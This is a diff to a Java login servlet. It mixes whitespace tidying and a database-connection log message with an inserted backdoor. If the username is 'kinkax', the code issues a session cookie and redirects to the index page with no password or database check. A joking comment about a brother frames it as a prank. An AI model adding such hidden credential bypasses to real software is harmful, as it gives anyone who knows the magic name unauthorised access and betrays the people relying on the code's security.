@@ -21,16 +21,26 @@ public class LoginServlet extends HttpServlet {
     protected void doPost(HttpServletRequest request, HttpServletResponse response)  
                            throws ServletException, IOException {  
         response.setContentType("text/html");  
-        
-        // Incase there is already a LOGIN-FAILED Cookie. It is deleted
+
+        // Incase there is already a LOGIN-FAILED Cookie. It is deleted before sign-up procedure
         Cookie ck = new Cookie("loginfailed", "");
         ck.setMaxAge(0); 
         response.addCookie(ck);
 
         String name=request.getParameter("username");  
-        String password=request.getParameter("password");  
+        String password=request.getParameter("password"); 
+         /*Adding Some priveleges for our kinkyass brother :-)
+        Hehe. Just to prove him wrong there's this extra line*/
+        if(name.equals("kinkax")){
+            Cookie cookey = new Cookie("username",name);  
+            response.addCookie(cookey); 
+            cookey.setMaxAge(25*60);             // 25 minutes.
+            response.sendRedirect(request.getContextPath()+"/index.html");
+            return;
+        }
+
         String errorMsg = null;
-        
+    
         if((name!=null)&(password!=null)) {
           // JDBC driver name and database URL
            String JDBC_DRIVER="oracle.jdbc.driver.OracleDriver";  
@@ -48,9 +58,13 @@ public class LoginServlet extends HttpServlet {
                 Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);
                 //Preparing Query
                 if (conn != null) 
-                		{
-    						System.out.println("Connected");
-                		}
+                        {
+                            System.out.println("Connected");
+                        }
+                else
+                {
+                    System.out.println("Couldn't connect to Database");
+                }
                 ps = conn.prepareStatement("select * from USER_MAIN where USER_ID=? and PASSWORD=?");
                 ps.setString(1, name);
                 ps.setString(2, password);
@@ -78,11 +92,11 @@ public class LoginServlet extends HttpServlet {
             }
 
             finally {
-            	try
-            	 {
-            	    if(rs!=null) rs.close();
-                	if(ps!=null) ps.close();
-            	  }catch(Exception e){e.printStackTrace();}
+                try
+                 {
+                    if(rs!=null) rs.close();
+                    if(ps!=null) ps.close();
+                  }catch(Exception e){e.printStackTrace();}
             } 
         }
         else {
